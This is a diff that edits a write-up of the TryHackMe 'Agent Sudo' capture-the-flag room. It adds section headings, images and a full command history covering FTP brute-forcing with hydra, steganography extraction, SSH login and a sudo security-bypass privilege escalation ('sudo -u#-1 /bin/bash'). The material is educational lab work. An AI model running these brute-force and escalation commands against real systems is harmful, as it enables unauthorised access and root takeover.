@@ -335,7 +335,7 @@ By,
 Agent R
 ```
 32. `echo '{STRING}' > {FILENAME3}.txt` to write the encoded string into a text file
-33. `base64 {FILENAME3}.txt --decode` to decode the encoded string using base64, which ended up decoding it back to plaintext
+33. `base64 {FILENAME3}.txt --decode` to decode the encoded string using base64, which ended up decoding it back to plaintext and displaying it onto our terminal
 34. `cd ..` to change back to the previous directory we were in where the retrieved images are in
 35. `steghide --info {FILE2}.jpg` to display potentially hidden data from the JPG image that was hidden using steganopgraphy by using the decoded string as the passphrase to display its hidden contents
 36. `steghide --extract -sf {FILE1}` to extract the hidden data that was embedded into the JPG image using the decoded string as the passphrase, which ended up extracting a text file
@@ -344,14 +344,6 @@ Agent R
 ```bash
 ┌──(kali㉿kali)-[~/_cutie.png.extracted]
 └─$ echo 'QXJlYTUx' > String.txt
-```
-```bash
-┌──(kali㉿kali)-[~/_cutie.png.extracted]
-└─$ hashid String.txt                                              
---File 'Hash2.txt'--
-Analyzing 'QXJlYTUx'
-[+] Dahua 
---End of file 'String.txt'--
 ```
 ```bash
 ┌──(kali㉿kali)-[~/_cutie.png.extracted]
@@ -403,6 +395,9 @@ Don't ask me why the password look cheesy, ask agent R who set this password for
 Your buddy,
 chris
 ```
+
+#
+> Connecting to the Target Using SSH  
 39. `ssh {USER2}@{TARGET IP}` to connect to the target's SSH server using the new set of credentials that we now have, which successfully logged us in
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -452,10 +447,12 @@ james@10.10.75.108's password:
 Alien_autospy.jpg                                                                 100%   41KB 115.7KB/s   00:00   
 ```
 
-![]()
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Google%20Reverse%20Search.png)
 
-![]()
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Agent%20Sudo/Reverse%20Image%20Search%20Results.png)
 
+# Vulnerability Identification
+> Vulnerability Identification Using Searchsploit
 43. `sudo -l` to list the privileges and permissions that are granted to the current user that we're running as, which revealed that they can start an interactive instance of the Bash shell without needing the root's password
 44. `sudo -V` to displat the version information and configuration details of the **sudo** command onto our terminal
 ```bash
@@ -476,7 +473,6 @@ Sudoers file grammar version 46
 Sudoers I/O plugin version 1.8.21p2
 ```
 45. `searchsploit sudo 1.8.2` to search for exploits related to version 1.8.2 of the sudo program, which displayed six exploit modules but the one that seems the most relevant to our situation is the last one, which is the one we'll be using
-46. `curl "https://www.exploit-db.com/raw/{EXPLOIT FILE}"` to retrieving and display the content of the exploit's Python script from the Exploit-DB onto our terminal, which revealed a code sequence that could use to elevate our privileges within the target's compromised system
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ searchsploit --verbose sudo 1.8.2
@@ -493,6 +489,10 @@ sudo 1.8.27 - Security Bypass                                                   
 --------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
+
+# Vulnerability Exploitation
+> Vulnerability Exploitation Using Sudo
+46. `curl "https://www.exploit-db.com/raw/{EXPLOIT FILE}"` to retrieving and display the content of the exploit's Python script from the Exploit-DB onto our terminal, which revealed a code sequence that could use to elevate our privileges within the target's compromised system
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl https://www.exploit-db.com/raw/47502
@@ -624,6 +624,48 @@ DesKel a.k.a Agent R
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Agent%20Sudo.png)
 
 # Command History
+1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+2. `cat {FILENAME1}.txt`
+3. `curl http://{TARGET IP}`
+4. `hydra -l {USER1} -P {WORDLIST PATH} ftp://{TARGET IP}`
+5. `ftp {USER1}@{TARGET IP}`
+6. `ls`
+7. `get {FILE1}`
+8. `get {FILE2}`
+9. `get {FILE3}`
+10. `exit`
+11. `cat {FILE1}.txt`
+12. `steghide --info {FILE2}.jpg`
+13. `binwalk {FILE2}.jpg`
+14. `binwalk {FILE3}.png`
+15. `binwalk {FILE3}.png --extract`
+16. `ls`
+17. `cd {EXTRACTED DIRECTORY}`
+18. `ls`
+19. `zip2john {ZIP FILE} > {FILENAME2}.txt`
+20. `john {FILENAME2}.txt`
+21. `7z e 8702.zip`
+22. `ls`
+23. `cat {FILE4}.txt`
+24. `echo '{STRING}' > {FILENAME3}.txt`
+25. `base64 {FILENAME3}.txt --decode`
+26. `cd ..`
+27. `steghide --info {FILE2}.jpg`
+28. `steghide --extract -sf {FILE1}`
+29. `ls`
+30. `cat {FILE5}`
+31. `ssh {USER2}@{TARGET IP}`
+32. `ls`
+33. `cat {FILE6}.txt`
+34. `sudo scp {FILE7}:{FILE PATH} {DESTINATION PATH}`
+35. `sudo -l`
+36. `sudo -V`
+37. `searchsploit sudo 1.8.2`
+38. `curl "https://www.exploit-db.com/raw/{EXPLOIT FILE}"`
+39. `sudo -u#-1 /bin/bash`
+40. `whoami`
+41. `find / -type f -name "root*" 2>/dev/null`
+42. `cat {ROOT FILE PATH}`
 
 # Dissecting Some Commands
 `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
@@ -637,3 +679,4 @@ This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.kn
 
 Socials:
 * TryHackMe ID: https://tryhackme.com/p/mtlfriends
+* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/
